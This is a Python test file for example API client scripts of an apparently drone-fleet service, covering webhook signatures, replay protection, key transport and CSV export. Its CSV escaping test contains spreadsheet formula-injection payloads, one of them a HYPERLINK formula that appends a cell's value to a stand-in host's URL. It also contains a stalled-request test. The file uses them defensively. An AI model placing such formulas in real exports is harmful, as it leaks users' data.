"""Offline checks for the examples. No network, no key, standard library only.

    python -m unittest discover -s tests -v
"""
import ast
import hashlib
import hmac
import importlib.util
import json
import os
import socket
import subprocess
import sys
import threading
import time
import unittest
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCRIPT_DIRS = ("python", "webhooks", "mcp")
LOCAL_MODULES = {"_rotorlab"}

# The standard library modules the examples may import. On Python 3.10 and
# later the interpreter's own list is used as well.
STDLIB = {
    "argparse", "ast", "collections", "csv", "datetime", "hashlib", "hmac",
    "http", "json", "os", "sys", "urllib", "uuid",
}
if hasattr(sys, "stdlib_module_names"):
    STDLIB |= set(sys.stdlib_module_names)


def scripts():
    found = []
    for folder in SCRIPT_DIRS:
        path = os.path.join(ROOT, folder)
        for name in sorted(os.listdir(path)):
            if name.endswith(".py"):
                found.append(os.path.join(path, name))
    return found


def runnable():
    """Scripts with a command line (not the shared helper)."""
    return [p for p in scripts() if not os.path.basename(p).startswith("_")]


def offline_env():
    env = dict(os.environ)
    env.pop("ROTORLAB_API_KEY", None)
    env.pop("ROTORLAB_WEBHOOK_SECRET", None)
    # an address nothing listens on, in case a script ever called out early
    env["ROTORLAB_URL"] = "http://127.0.0.1:9"
    return env


def run(path, *args):
    return subprocess.run([sys.executable, path] + list(args), cwd=os.path.dirname(path),
                          env=offline_env(), stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, universal_newlines=True, timeout=60)


class GrammarAndImports(unittest.TestCase):
    def test_there_are_examples(self):
        self.assertGreaterEqual(len(runnable()), 8)

    def test_parses_as_python_3_8(self):
        for path in scripts():
            with self.subTest(script=os.path.relpath(path, ROOT)):
                with open(path, encoding="utf-8") as fh:
                    source = fh.read()
                ast.parse(source, filename=path, feature_version=(3, 8))

    def test_imports_only_the_standard_library(self):
        for path in scripts():
            with open(path, encoding="utf-8") as fh:
                tree = ast.parse(fh.read(), filename=path)
            for node in ast.walk(tree):
                names = []
                if isinstance(node, ast.Import):
                    names = [a.name for a in node.names]
                elif isinstance(node, ast.ImportFrom):
                    self.assertEqual(node.level, 0, path)
                    names = [node.module or ""]
                for name in names:
                    top = name.split(".")[0]
                    with self.subTest(script=os.path.relpath(path, ROOT), module=name):
                        self.assertTrue(top in STDLIB or top in LOCAL_MODULES,
                                        "%s imports %s" % (path, name))


class CommandLines(unittest.TestCase):
    def test_every_script_answers_help(self):
        for path in runnable():
            with self.subTest(script=os.path.relpath(path, ROOT)):
                done = run(path, "--help")
                self.assertEqual(done.returncode, 0, done.stderr)
                self.assertIn("usage:", done.stdout)

    def test_no_key_is_a_clear_refusal_not_a_network_call(self):
        cases = [("python/check_key.py",), ("python/list_aircraft.py",),
                 ("python/list_pilots.py",), ("python/list_flights.py",),
                 ("python/aircraft_record.py", "Survey 1"),
                 ("python/analyze_build.py",),
                 ("python/file_flight.py", "--aircraft-id", "4", "--minutes", "10"),
                 ("mcp/mcp_call.py", "list"),
                 ("webhooks/receiver.py",)]
        for case in cases:
            with self.subTest(script=case[0]):
                done = run(os.path.join(ROOT, case[0]), *case[1:])
                self.assertEqual(done.returncode, 2, done.stderr)
                self.assertTrue("ROTORLAB_API_KEY" in done.stderr
                                or "ROTORLAB_WEBHOOK_SECRET" in done.stderr, done.stderr)

    def test_bad_arguments_exit_2(self):
        cases = [("python/aircraft_record.py",),
                 ("python/aircraft_record.py", "x", "--flights", "0"),
                 ("python/list_flights.py", "--limit", "5000"),
                 ("python/file_flight.py", "--minutes", "10"),
                 ("python/file_flight.py", "--aircraft-id", "4"),
                 ("python/file_flight.py", "--aircraft-id", "4", "--aircraft-name", "x",
                  "--minutes", "10"),
                 ("python/file_flight.py", "--aircraft-id", "4", "--minutes", "-1"),
                 ("python/file_flight.py", "--aircraft-id", "4", "--minutes", "5",
                  "--type", "other"),
                 ("python/file_flight.py", "--aircraft-id", "4", "--minutes", "5",
                  "--type", "warp"),
                 ("python/attach_log.py", "12"),
                 ("python/attach_log.py", "12", "no-such-file.bin"),
                 ("mcp/mcp_call.py",),
                 ("mcp/mcp_call.py", "call", "recent_flights", "--args", "[1]")]
        for case in cases:
            with self.subTest(case=" ".join(case)):
                done = run(os.path.join(ROOT, case[0]), *case[1:])
                self.assertEqual(done.returncode, 2, done.stdout + done.stderr)

    def test_file_flight_dry_run_builds_the_documented_body(self):
        done = run(os.path.join(ROOT, "python", "file_flight.py"), "--aircraft-id", "4",
                   "--minutes", "18.5", "--date", "2026-11-14", "--type", "inspection",
                   "--site", "North substation", "--ref", "station7-000123",
                   "--landings", "1", "--night", "--dry-run")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertEqual(json.loads(done.stdout), {
            "external_ref": "station7-000123", "asset_id": 4, "duration_min": 18.5,
            "flown_at": "2026-11-14", "flight_type": "inspection",
            "site": "North substation", "landings": 1, "night": True})

    def test_file_flight_dry_run_for_an_unregistered_airframe(self):
        done = run(os.path.join(ROOT, "python", "file_flight.py"), "--aircraft-name",
                   "Loaner quad", "--minutes", "7", "--type", "other",
                   "--type-other", "Demo for a client", "--dry-run")
        self.assertEqual(done.returncode, 0, done.stderr)
        body = json.loads(done.stdout)
        self.assertEqual(body["asset_name"], "Loaner quad")
        self.assertNotIn("asset_id", body)
        self.assertEqual(body["flight_type_other"], "Demo for a client")
        self.assertTrue(body["external_ref"].startswith("example-"))


def load(relpath, name):
    spec = importlib.util.spec_from_file_location(name, os.path.join(ROOT, relpath))
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class Helpers(unittest.TestCase):
    def test_base_url(self):
        sys.path.insert(0, os.path.join(ROOT, "python"))
        try:
            rl = load("python/_rotorlab.py", "_rotorlab_under_test")
        finally:
            sys.path.pop(0)
        self.assertEqual(rl.base_url("https://example.test"), "https://example.test/api/v1")
        self.assertEqual(rl.base_url("https://example.test/"), "https://example.test/api/v1")
        self.assertEqual(rl.base_url("https://example.test/api/v1/"),
                         "https://example.test/api/v1")

    def test_find_aircraft(self):
        sys.path.insert(0, os.path.join(ROOT, "python"))
        try:
            rec = load("python/aircraft_record.py", "aircraft_record_under_test")
        finally:
            sys.path.pop(0)
        rows = [{"id": 4, "name": "Survey 1", "registration": "N901XX", "serial": "SN-1"},
                {"id": 5, "name": "Survey 2", "registration": "N902XX", "serial": ""}]
        self.assertEqual(rec.find_aircraft(rows, "5")["id"], 5)
        self.assertEqual(rec.find_aircraft(rows, "survey 1")["id"], 4)
        self.assertEqual(rec.find_aircraft(rows, "n902xx")["id"], 5)
        self.assertEqual(rec.find_aircraft(rows, "SN-1")["id"], 4)
        self.assertIsNone(rec.find_aircraft(rows, "nothing"))


class WebhookSignature(unittest.TestCase):
    def setUp(self):
        self.recv = load("webhooks/receiver.py", "receiver_under_test")
        self.secret = "whsec_example_secret_for_tests"
        self.body = b'{"event": "ping", "at": "2026-11-15 12:00:00", "data": {"message": "x"}}'

    def test_matches_hmac_sha256_of_the_raw_body(self):
        want = "sha256=" + hmac.new(self.secret.encode("utf-8"), self.body,
                                    hashlib.sha256).hexdigest()
        self.assertEqual(self.recv.expected_signature(self.secret, self.body), want)
        self.assertTrue(self.recv.verify_signature(self.secret, self.body, want))

    def test_refuses_a_changed_body_a_wrong_secret_or_no_header(self):
        good = self.recv.expected_signature(self.secret, self.body)
        self.assertFalse(self.recv.verify_signature(self.secret, self.body + b" ", good))
        self.assertFalse(self.recv.verify_signature("whsec_other", self.body, good))
        self.assertFalse(self.recv.verify_signature(self.secret, self.body, None))
        self.assertFalse(self.recv.verify_signature(self.secret, self.body, ""))
        self.assertFalse(self.recv.verify_signature("", self.body, good))

    def test_a_non_ascii_header_is_refused_not_raised(self):
        self.assertFalse(self.recv.verify_signature(self.secret, self.body, "sha256=\xe9"))


def utc_stamp(seconds_ago=0):
    return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(time.time() - seconds_ago))


class LiveReceiver(unittest.TestCase):
    """The receiver on a loopback port, fed signed bodies the way RotorLab
    signs them (HMAC-SHA256 of the raw body)."""

    secret = "whsec_example_secret_for_tests"

    def setUp(self):
        self.recv = load("webhooks/receiver.py", "receiver_live_under_test")
        self.handled = []
        self.fail_next = 0

        def handler(event, at, data):
            if self.fail_next:
                self.fail_next -= 1
                raise RuntimeError("database briefly down")
            self.handled.append((event, at, data))

        self.server = self.recv.make_server("127.0.0.1", 0, self.secret, handler=handler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()

    def body(self, event="flight.voided", at=None, data=None):
        return json.dumps({"event": event, "at": at or utc_stamp(),
                           "data": data or {"flight_id": 359}}).encode("utf-8")

    def post(self, body, delivery=None, signature=None, timeout=5):
        headers = {"Content-Type": "application/json",
                   "X-RotorLab-Signature": signature or
                   self.recv.expected_signature(self.secret, body)}
        if delivery is not None:
            headers["X-RotorLab-Delivery"] = delivery
        req = urllib.request.Request("http://127.0.0.1:%d/" % self.port, data=body,
                                     method="POST", headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status, resp.read().decode("utf-8").strip()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8").strip()

    def test_m1_a_replay_with_another_or_no_delivery_id_is_handled_once(self):
        body = self.body()
        for delivery in ("1", "2", None, "999999"):
            status, _ = self.post(body, delivery=delivery)
            self.assertEqual(status, 200)
        self.assertEqual(len(self.handled), 1)

    def test_m1_a_signed_body_older_than_the_window_is_not_handled(self):
        status, text = self.post(self.body(at=utc_stamp(25 * 3600)), delivery="5")
        self.assertEqual(status, 200)
        self.assertEqual(text, "too old, ignored")
        self.assertEqual(self.handled, [])

    def test_m1_a_bad_signature_is_refused(self):
        status, _ = self.post(self.body(), signature="sha256=" + "0" * 64)
        self.assertEqual(status, 401)
        self.assertEqual(self.handled, [])

    def test_m2_a_delivery_that_failed_is_handled_on_the_retry(self):
        self.fail_next = 1
        body = self.body(event="workorder.raised", data={"order_id": 1043})
        status, _ = self.post(body, delivery="1043")
        self.assertEqual(status, 500)
        status, text = self.post(body, delivery="1043")
        self.assertEqual((status, text), (200, "ok"))
        self.assertEqual(len(self.handled), 1)

    def test_s2_the_event_comes_from_the_signed_body(self):
        body = json.dumps({"at": utc_stamp(), "data": {}}).encode("utf-8")
        status, _ = self.post(body)
        self.assertEqual(status, 400)
        self.assertEqual(self.handled, [])

    def test_m3_a_stalled_client_does_not_block_a_delivery(self):
        slow = socket.create_connection(("127.0.0.1", self.port), timeout=5)
        try:
            slow.sendall(b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 1000000\r\n\r\n0123456789")
            started = time.time()
            status, _ = self.post(self.body(), delivery="7", timeout=5)
            self.assertEqual(status, 200)
            self.assertLess(time.time() - started, 5)
        finally:
            slow.close()


class _Recorder(object):
    def __init__(self):
        self.requests = []


def _loopback_server(handler_cls):
    server = HTTPServer(("127.0.0.1", 0), handler_cls)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


class KeyTransport(unittest.TestCase):
    """M4: the key goes only over https (or to loopback) and never follows a redirect."""

    def setUp(self):
        sys.path.insert(0, os.path.join(ROOT, "python"))
        try:
            self.rl = load("python/_rotorlab.py", "_rotorlab_transport_under_test")
        finally:
            sys.path.pop(0)
        self.mcp = load("mcp/mcp_call.py", "mcp_call_under_test")

    def quiet_exit(self, fn, *args):
        saved = sys.stderr
        sys.stderr = open(os.devnull, "w")
        try:
            with self.assertRaises(SystemExit) as caught:
                fn(*args)
        finally:
            sys.stderr.close()
            sys.stderr = saved
        return caught.exception.code

    def test_plain_http_is_refused_except_to_loopback(self):
        self.assertEqual(self.quiet_exit(self.rl.base_url, "http://app.example.test"), 2)
        self.assertEqual(self.quiet_exit(self.mcp.endpoint, "http://app.example.test"), 2)
        self.assertEqual(self.rl.base_url("http://127.0.0.1:8820"), "http://127.0.0.1:8820/api/v1")
        self.assertEqual(self.rl.base_url("http://localhost:8820"), "http://localhost:8820/api/v1")
        self.assertEqual(self.mcp.endpoint("http://127.0.0.1:8820"), "http://127.0.0.1:8820/mcp")
        self.assertEqual(self.rl.base_url("https://app.example.test"),
                         "https://app.example.test/api/v1")

    def test_a_redirect_is_not_followed_and_the_key_does_not_move(self):
        seen = _Recorder()

        class Target(BaseHTTPRequestHandler):
            def do_GET(self):
                seen.requests.append(dict(self.headers))
                self.send_response(200)
                self.send_header("Content-Length", "2")
                self.end_headers()
                self.wfile.write(b"{}")

            def log_message(self, *a):
                pass

        target = _loopback_server(Target)
        target_url = "http://127.0.0.1:%d/" % target.server_address[1]

        class Redirector(BaseHTTPRequestHandler):
            def do_GET(self):
                self.rfile.read(int(self.headers.get("Content-Length") or 0))
                self.send_response(302)
                self.send_header("Location", target_url)
                self.send_header("Content-Length", "0")
                self.end_headers()

            do_POST = do_GET

            def log_message(self, *a):
                pass

        redirector = _loopback_server(Redirector)
        try:
            url = "http://127.0.0.1:%d" % redirector.server_address[1]
            with self.assertRaises(self.rl.ApiError) as caught:
                self.rl.request("GET", "version", "rl_your_key", url=url, timeout=5)
            self.assertEqual(caught.exception.status, 302)
            status, _ = self.mcp.rpc(url, "rl_your_key", "ping")
            self.assertEqual(status, 302)
            self.assertEqual(seen.requests, [])
        finally:
            for s in (target, redirector):
                s.shutdown()
                s.server_close()


class CsvFormulas(unittest.TestCase):
    """S4: a cell a spreadsheet would run as a formula is written as text."""

    def test_safe_cell(self):
        sys.path.insert(0, os.path.join(ROOT, "python"))
        try:
            lf = load("python/list_flights.py", "list_flights_under_test")
        finally:
            sys.path.pop(0)
        for bad in ("=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx",
                    '=HYPERLINK("https://x.example/?"&A1,"open")'):
            self.assertEqual(lf.safe_cell(bad), "'" + bad)
        self.assertEqual(lf.safe_cell("North substation"), "North substation")
        self.assertEqual(lf.safe_cell(1140.0), 1140.0)
        self.assertEqual(lf.safe_cell(None), "")

    def test_csv_output_end_to_end(self):
        rows = {"flights": [{"id": 1, "flown_at": "2026-11-14", "asset_id": 4, "pilot_id": 3,
                             "pilot_name": "A pilot", "duration_s": 60.0, "flight_type": "test",
                             "site": '=HYPERLINK("https://x.example/","open")',
                             "external_ref": "ref-1"}]}
        payload = json.dumps(rows).encode("utf-8")

        class Api(BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)

            def log_message(self, *a):
                pass

        api = _loopback_server(Api)
        try:
            env = offline_env()
            env["ROTORLAB_URL"] = "http://127.0.0.1:%d" % api.server_address[1]
            env["ROTORLAB_API_KEY"] = "rl_your_key"
            path = os.path.join(ROOT, "python", "list_flights.py")
            done = subprocess.run([sys.executable, path, "--csv"], cwd=os.path.dirname(path),
                                  env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  universal_newlines=True, timeout=60)
        finally:
            api.shutdown()
            api.server_close()
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("'=HYPERLINK", done.stdout)
        self.assertNotIn(',"=HYPERLINK', done.stdout)
        self.assertNotIn(",=HYPERLINK", done.stdout)


class PublishedCopies(unittest.TestCase):
    def test_copies_are_valid_json(self):
        for rel in ("openapi/openapi.json", "postman/rotorlab.postman_collection.json"):
            with self.subTest(file=rel):
                with open(os.path.join(ROOT, rel), encoding="utf-8") as fh:
                    json.load(fh)

    def test_every_path_the_examples_call_is_in_the_spec(self):
        with open(os.path.join(ROOT, "openapi", "openapi.json"), encoding="utf-8") as fh:
            paths = json.load(fh)["paths"]
        for method, path in (("get", "/version"), ("get", "/usage"), ("get", "/aircraft"),
                             ("get", "/health/{id}"), ("get", "/pilots"),
                             ("get", "/flights"), ("post", "/flights"),
                             ("post", "/flights/{id}/log"), ("post", "/analyze")):
            with self.subTest(call="%s %s" % (method.upper(), path)):
                self.assertIn(method, paths.get(path, {}))


if __name__ == "__main__":
    unittest.main()
